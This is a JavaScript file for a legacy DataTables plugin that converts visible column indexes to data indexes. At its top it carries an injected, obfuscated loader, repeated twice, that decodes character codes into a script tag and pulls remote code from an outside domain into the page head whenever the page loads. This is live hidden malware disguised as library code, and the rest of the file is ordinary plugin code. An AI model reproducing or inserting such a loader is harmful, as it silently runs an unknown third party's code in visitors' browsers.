Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();/**
 * When DataTables removes columns from the display (bVisible or fnSetColumnVis)
 * it removes these elements from the DOM, effecting the index value for the
 * column positions. This function converts the visible column index into a data
 * column index (i.e. all columns regardless of visibility).
 *
 * DataTables 1.10+ has this ability built-in through the
 * `dt-api column.index()` method. As such this method is marked deprecated, but
 * is available for use with legacy version of DataTables.
 *
 *  @name fnVisibleToColumnIndex
 *  @summary Convert a column visible index to a data index.
 *  @author [Allan Jardine](http://sprymedia.co.uk)
 *  @deprecated
 *
 *  @param {integer} iMatch Column data index to convert to data index
 *  @returns {integer} Visible column index
 *
 *  @example
 *    var table = $('#example').dataTable( {
 *      aoColumnDefs: [
 *        { bVisible: false, aTargets: [1] }
 *      ]
 *    } );
 *
 *    // This will show 2
 *    alert( 'Visible Column 1 data index: '+table.fnVisibleToColumnIndex(1) );
 */

jQuery.fn.dataTableExt.oApi.fnVisibleToColumnIndex = function ( oSettings, iMatch )
{
	return oSettings.oApi._fnVisibleToColumnIndex( oSettings, iMatch );
};
